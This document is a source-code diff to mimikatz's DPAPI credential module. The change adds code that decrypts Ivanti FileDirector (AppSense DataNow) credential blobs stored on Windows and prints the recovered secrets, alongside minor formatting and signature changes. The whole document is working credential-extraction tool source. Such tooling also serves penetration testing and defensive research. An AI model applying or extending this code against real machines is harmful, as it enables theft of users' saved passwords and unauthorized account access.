@@ -1,5 +1,5 @@
 /*	Benjamin DELPY `gentilkiwi`
-	http://blog.gentilkiwi.com
+	https://blog.gentilkiwi.com
 	benjamin@gentilkiwi.com
 	Licence : https://creativecommons.org/licenses/by/4.0/
 */
@@ -19,7 +19,7 @@ NTSTATUS kuhl_m_dpapi_cred(int argc, wchar_t * argv[])
 	{
 		if(kull_m_file_readData(infile, &file, &szFile))
 		{
-			if(szFile >= (DWORD)FIELD_OFFSET(KULL_M_DPAPI_BLOB, dwMasterKeyVersion))
+			if(szFile >= (DWORD) FIELD_OFFSET(KULL_M_DPAPI_BLOB, dwMasterKeyVersion))
 			{
 				isNT5Cred = RtlEqualGuid(file + sizeof(DWORD), &KULL_M_DPAPI_GUID_PROVIDER);
 				kull_m_dpapi_blob_quick_descr(0, isNT5Cred ? file : ((PKUHL_M_DPAPI_ENCRYPTED_CRED) file)->blob);
@@ -42,7 +42,7 @@ NTSTATUS kuhl_m_dpapi_cred(int argc, wchar_t * argv[])
 							kull_m_cred_descr(0, cred);
 							if(kull_m_string_args_byName(argc, argv, L"lsaiso", NULL, NULL))
 							{
-								kuhl_m_sekurlsa_genericLsaIsoOutput((PLSAISO_DATA_BLOB) cred->CredentialBlob);
+								kuhl_m_sekurlsa_genericLsaIsoOutput((PLSAISO_DATA_BLOB) cred->CredentialBlob, NULL, NULL);
 								kprintf(L"\n");
 							}
 							else kuhl_m_dpapi_cred_tryEncrypted(cred->TargetName, cred->CredentialBlob, cred->CredentialBlobSize, argc, argv);
@@ -165,18 +165,50 @@ void kuhl_m_dpapi_cred_tryEncrypted(LPCWSTR target, LPCBYTE data, DWORD dataLen,
 {
 	PVOID cred;
 	DWORD credLen;
+	PKULL_M_CRED_APPSENSE_DN pAppDN;
 	if(wcsstr(target, L"Microsoft_WinInet_"))
 	{
-		if(dataLen >= (DWORD)FIELD_OFFSET(KULL_M_DPAPI_BLOB, dwMasterKeyVersion))
+		if(dataLen >= (DWORD) FIELD_OFFSET(KULL_M_DPAPI_BLOB, dwMasterKeyVersion))
 		{
 			if(RtlEqualGuid(data + sizeof(DWORD), &KULL_M_DPAPI_GUID_PROVIDER))
 			{
-				kprintf(L"\n");
 				if(kuhl_m_dpapi_unprotect_raw_or_blob(data, dataLen, NULL, argc, argv, KULL_M_CRED_ENTROPY_CRED_DER, sizeof(KULL_M_CRED_ENTROPY_CRED_DER), &cred, &credLen, L"Decrypting additional blob\n"))
 				{
 					kprintf(L"   CredentialBlob: ");
 					kull_m_string_printSuspectUnicodeString(cred, credLen);
+					kprintf(L"\n");
 					LocalFree(cred);
+				}
+			}
+		}
+	}
+	else if(wcsstr(target, L"AppSense_DataNow_"))
+	{
+		kprintf(L"\n* Ivanti FileDirector credential blob *\n");
+		if(dataLen >= (DWORD) FIELD_OFFSET(KULL_M_CRED_APPSENSE_DN, data))
+		{
+			pAppDN = (PKULL_M_CRED_APPSENSE_DN) data;
+			if(!strcmp("AppN_DN_Win", pAppDN->type))
+			{
+				if(pAppDN->credBlobSize)
+				{
+					if(kuhl_m_dpapi_unprotect_raw_or_blob(pAppDN->data, pAppDN->credBlobSize, NULL, argc, argv, NULL, 0, &cred, &credLen, L"Decrypting additional blob\n"))
+					{
+						kprintf(L"   CredentialBlob: ");
+						kull_m_string_printSuspectUnicodeString(cred, credLen);
+						kprintf(L"\n");
+						LocalFree(cred);
+					}
+				}
+				if(pAppDN->unkBlobSize)
+				{
+					if(kuhl_m_dpapi_unprotect_raw_or_blob(pAppDN->data + pAppDN->credBlobSize, pAppDN->unkBlobSize, NULL, argc, argv, NULL, 0, &cred, &credLen, L"Decrypting additional blob\n"))
+					{
+						kprintf(L"   UnkBlob       : ");
+						kull_m_string_printSuspectUnicodeString(cred, credLen);
+						kprintf(L"\n");
+						LocalFree(cred);
+					}
 				}
 			}
 		}
@@ -195,7 +227,6 @@ BOOL kuhl_m_dpapi_vault_key_type(PKULL_M_CRED_VAULT_CREDENTIAL_ATTRIBUTE attribu
 		calgId = CALG_AES_128;
 		key = aes128;
 		keyLen = AES_128_KEY_SIZE;
-		
 	}
 	else
 	{
